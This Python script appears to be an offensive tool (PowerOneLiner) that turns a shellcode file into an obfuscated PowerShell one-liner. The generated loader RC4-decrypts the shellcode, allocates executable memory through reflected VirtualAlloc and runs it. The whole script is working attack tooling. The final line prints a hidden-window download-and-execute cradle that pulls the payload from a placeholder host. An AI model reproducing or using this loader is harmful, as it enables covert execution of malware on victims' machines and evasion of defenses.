import base64
import argparse
import gzip
import string
import random

def GenerateRandomString(length=8):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def Rc4Encrypt(key, data):
    S = list(range(256))
    j = 0
    output = bytearray()

    # KSA (Key Scheduling Algorithm)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0

    # PRGA (Pseudo-Random Generation Algorithm)
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        output.append(byte ^ k)

    return bytes(output)


parser = argparse.ArgumentParser(description='powershell一句话上线便捷生成器.')
parser.add_argument('-input', help='输入的shellcode文件' ,required=True)
parser.add_argument('-arch', type=int, choices=[0, 1], help='输入的shellcode的位数(0为32位 1为64位)',required=True)
parser.add_argument('-output', default="one_liner.ps1", help='输出的ps1文件名')

args = parser.parse_args()

print('[-] https://github.com/baiyies/PowerOneLiner')

templateStage1 = '$cm=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%s"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($cm,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'

templateStage2x86 = r"""
Set-StrictMode -Version 2
$DoIt = @'
function Crypt {
    param (
        [byte[]]$key,
        [byte[]]$data
    )

    $s = 0..255
    $j = 0

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $s[$i] + $key[$i %% $key.Length]) %% 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
    }

    $i = $j = 0
    $output = [byte[]]::new($data.Length)

    for ($count = 0; $count -lt $data.Length; $count++) {
        $i = ($i + 1) %% 256
        $j = ($j + $s[$i]) %% 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
        $k = $s[($s[$i] + $s[$j]) %% 256]
        $output[$count] = $data[$count] -bxor $k
    }

    $output
}
function func_get_proc_address{
	Param($var_module, $var_procedure)
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress',[Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}
function func_get_delegate_type{
	Param(
		[Parameter(Position = 0, Mandatory = $True)][Type[]] $var_parameters,
		[Parameter(Position = 1)][Type] $var_return_type = [Void]
	)
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	return $var_type_builder.CreateType()
}
[Byte[]]$encryptedData = [System.Convert]::FromBase64String('%s')
$key = [Text.Encoding]::ASCII.GetBytes("%s")
$var_code = Crypt -key $key -data $encryptedData

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@
If([IntPtr]::size -eq 8) {
	start-job{ param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
IEX $DoIt
}
"""

templateStage2x64 = r"""
Set-StrictMode -Version 2
$DoIt = @'
function Crypt {
    param (
        [byte[]]$key,
        [byte[]]$data
    )

    $s = 0..255
    $j = 0

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $s[$i] + $key[$i %% $key.Length]) %% 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
    }

    $i = $j = 0
    $output = [byte[]]::new($data.Length)

    for ($count = 0; $count -lt $data.Length; $count++) {
        $i = ($i + 1) %% 256
        $j = ($j + $s[$i]) %% 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
        $k = $s[($s[$i] + $s[$j]) %% 256]
        $output[$count] = $data[$count] -bxor $k
    }

    $output
}
function func_get_proc_address{
	Param($var_module, $var_procedure)
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress',[Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}
function func_get_delegate_type{
	Param(
		[Parameter(Position = 0, Mandatory = $True)][Type[]] $var_parameters,
		[Parameter(Position = 1)][Type] $var_return_type = [Void]
	)
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	return $var_type_builder.CreateType()
}
[Byte[]]$encryptedData = [System.Convert]::FromBase64String('%s')
$key = [Text.Encoding]::ASCII.GetBytes("%s")
$var_code = Crypt -key $key -data $encryptedData

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@
If([IntPtr]::size -eq 8) {
	IEX $DoIt
}
"""

fileData = None

with open(args.input, "rb") as file:
    fileData = file.read()

print(f'[-] shellcode大小:{len(fileData)}B')

rc4Key = GenerateRandomString()
print(f'[-] rc4密钥为:{rc4Key}')

fileData = Rc4Encrypt(rc4Key.encode('ascii'), fileData)

b64Data = base64.b64encode(fileData)
b64Str = b64Data.decode('ascii')


# print(templateStage2x86)
if args.arch == 0:
    print('[-] shellcode为32位')
    stage2 = templateStage2x86 % (b64Str, rc4Key)
else:
    print('[-] shellcode为64位')
    stage2 = templateStage2x64 % (b64Str, rc4Key)

# print(stage2)
b64Stage2Data = stage2.encode('ascii')
compressedData = gzip.compress(b64Stage2Data)
b64CompressedStr = base64.b64encode(compressedData)
stage1 = templateStage1 % (b64CompressedStr.decode('ascii'))
# print(stage1)

print(f'[-] 准备写入输出到文件:{args.output} 大小:{len(stage1)}B')
with open(args.output, 'w', encoding = 'utf-8') as f:
    f.write(stage1)

print(f'[-] 一句话:powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring(\'http://xxxx.com/{args.output}\'))"')    

